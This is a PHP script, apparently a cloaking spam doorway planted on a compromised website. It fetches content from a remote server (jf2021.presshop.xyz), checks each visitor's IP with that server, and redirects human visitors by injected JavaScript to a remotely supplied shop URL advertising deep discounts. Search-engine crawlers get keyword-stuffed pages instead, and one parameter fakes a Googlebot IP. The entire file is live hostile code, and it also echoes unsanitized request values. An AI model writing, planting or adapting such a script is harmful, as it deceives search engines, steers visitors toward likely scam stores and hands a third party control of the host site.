<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$kname="";
if(!is_null($_GET['categoryid'])){
$categoryid=$_GET['categoryid'];
 }
 else
 {
$categoryid=mt_rand(1,200);
 }
if(!is_null($_GET['productid'])){
$kname=file_get_contents("http://jf2021.presshop.xyz/2021/gn.aspx?iid=".$_GET['productid']);

}
if(!is_null($_GET['s']))
{
if(!is_null($_GET['number']))
{

$url="http://jf2021.presshop.xyz/sjd.aspx?cid=".$categoryid."&number=".$_GET['number']."&pnum=".$_GET['pnum'];
$str=file_get_contents($url);
$str=str_replace('yymm', $http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
 $str = str_replace("iid=", "productid=",$str);
 $str = str_replace("cid=", "categoryid=",$str);
 echo $str;
 exit();
}
}
function check($ip){
	if(!is_null($_GET['kk'])){$ip="66.249.64.190";}
    $domain = file_get_contents("http://jf2021.presshop.xyz/getdomain.aspx?rnd=1&ip=".$ip);
    if(stripos($domain,'google')!=false or stripos($domain,'msn.com')!=false or stripos($domain,'yahoo.com')!=false or stripos($domain,'aol.com')!=false){}
else
	{
	if(!is_null($_GET['productid']))	
	{
$ccc=$_GET['productid'];		
$kname=file_get_contents("http://jf2021.presshop.xyz/0511/gn.aspx?iid=".$_GET['productid']);
$ddd=file_get_contents('http://jf2021.presshop.xyz/newurl.asp?cid='.$_GET['categoryid']);
$eee=$ddd.$kname;

echo '<script>document.location="'.$eee.'"</script>';
	}
     }		
   }
   function getIP() { 
		if (getenv('HTTP_CLIENT_IP')) { 
			$ip = getenv('HTTP_CLIENT_IP'); 
		} elseif (getenv('HTTP_X_FORWARDED_FOR')) { 
			$ip = getenv('HTTP_X_FORWARDED_FOR'); 
		} elseif (getenv('HTTP_X_FORWARDED')) { 
			$ip = getenv('HTTP_X_FORWARDED'); 
		} elseif (getenv('HTTP_FORWARDED_FOR')) { 
			$ip = getenv('HTTP_FORWARDED_FOR'); 
		} elseif (getenv('HTTP_FORWARDED')) { 
			$ip = getenv('HTTP_FORWARDED'); 
		} else { 
			$ip = $_SERVER['REMOTE_ADDR']; 
		} 
		return $ip; 
	} 
$validate = check(getIP());
   ?> 
<?php
$url="";

  $descriptions=file_get_contents("http://jf2021.presshop.xyz/getci.aspx?cid=".$categoryid."&s=4&e=5");
 $key=file_get_contents("http://jf2021.presshop.xyz/getci.aspx?cid=".$categoryid."&s=4&e=5");
$hyzhdy="http://jf2021.presshop.xyz/2021/doiid.aspx";
if(!is_null($_GET['productid'])){
$url=$hyzhdy."?iid=".$_GET['productid']."&mt=http://jf2021.presshop.xyz/en/333/".mt_rand(1,99).".txt&cid=".$_GET['categoryid'];
$title="jf2021,".$kname.",".$_SERVER['HTTP_HOST'];
$descri="OFF ".mt_rand(50,70)."%,".$kname.$descriptions;
 }
 else
 {
$url=$hyzhdy."?cid=".$categoryid."&pnum=".$_GET['pnum'];
$title=$key;
$descri="Official Store".$descriptions;
 }

 $ttttt=$title;
 $kkkkk=$kname;
 $iiiii=$descri;
 $ccccc=$http_type.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];

 $str = file_get_contents($url);
 $str = str_replace("iid=", "productid=",$str);
 $str = str_replace("cid=", "categoryid=",$str);
 $str=str_replace('UUUUU?',$http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."?",$str);
 $str=str_replace('BBBBB',$_SERVER['HTTP_HOST'],$str);
 $str=str_replace('NNNNN',$kname.$_GET['productid'],$str);
 $str=str_replace('DDDDD',$kname.$key.$_GET['searchtxt'],$str);
 $str=str_replace('TTTTT', $ttttt,$str);
 $str=str_replace('KKKKK', $kkkkk,$str);

 $str=str_replace('IIIII', $iiiii,$str);
 $str=str_replace('CCCCC', $ccccc,$str);
 echo $str;
?> 